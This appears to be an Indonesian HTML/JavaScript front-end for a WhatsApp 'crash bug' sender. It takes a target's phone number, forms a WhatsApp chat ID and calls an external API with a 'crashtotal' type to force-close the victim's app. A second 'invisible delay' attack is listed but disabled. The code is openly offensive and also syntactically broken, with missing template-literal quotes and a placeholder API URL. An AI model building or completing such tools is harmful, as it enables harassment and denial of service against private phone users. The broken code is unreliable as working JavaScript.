<!DOCTYPE html> <html lang="id"> <head> <meta charset="UTF-8" /> <meta name="viewport" content="width=device-width, initial-scale=1.0"/> <title>Kirim Bug WA</title> <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script> <style> body { background-color: #121212; color: #fff; font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; padding: 40px; } h1 { color: #00ffe1; } .form-container { background-color: #1e1e1e; padding: 25px; border-radius: 10px; box-shadow: 0 0 10px #00ffe1; width: 320px; } label { display: block; margin-bottom: 6px; margin-top: 14px; } input, select { width: 100%; padding: 10px; border-radius: 6px; margin-bottom: 10px; border: none; font-size: 14px; } button { width: 100%; padding: 12px; background-color: #00ffe1; border: none; border-radius: 8px; color: #000; font-weight: bold; font-size: 16px; cursor: pointer; } button:hover { background-color: #00c9b7; } .output { margin-top: 20px; padding: 15px; background-color: #222; border-radius: 10px; display: none; } </style> </head> <body> <h1>Kirim Bug WhatsApp</h1> <div class="form-container"> <label for="target">Nomor Target (tanpa +62):</label> <input type="text" id="target" placeholder="Contoh: 81234567890" /> <label for="bugType">Jenis Bug:</label> <select id="bugType"> <option value="force">Bug Force Close</option> <option value="invis" disabled>Bug Delay Invis (Belum Aktif)</option> </select> <button onclick="kirimBug()">Kirim Bug</button> </div> <div id="output" class="output"></div> <script> async function apiBug(targetNumber) { const apiUrl = api_nya&type=crashtotal; console.log(Memanggil API: ${apiUrl}); try { const response = await axios.get(apiUrl); return response.data; } catch (error) { console.error("Gagal memanggil API:", error.message); throw error; } } async function kirimBug() { const nomor = document.getElementById("target").value.trim(); const jenis = document.getElementById("bugType").value; const output = document.getElementById("output"); if (!nomor) { alert("Masukkan nomor target dulu!"); return; } const chatId = 62${nomor}@s.whatsapp.net; output.style.display = "block"; output.innerText = "Mengirim bug..."; try { if (jenis === "force") { const hasil = await apiBug(chatId); output.innerText = ✅ Bug Force Close berhasil dikirim!\nRespon: ${JSON.stringify(hasil)}; } else { output.innerText = "❌ Bug Delay Invis belum diaktifkan."; } } catch (err) { output.innerText = "❌ Gagal mengirim bug. Cek koneksi atau server API."; } } </script> </body> </html>
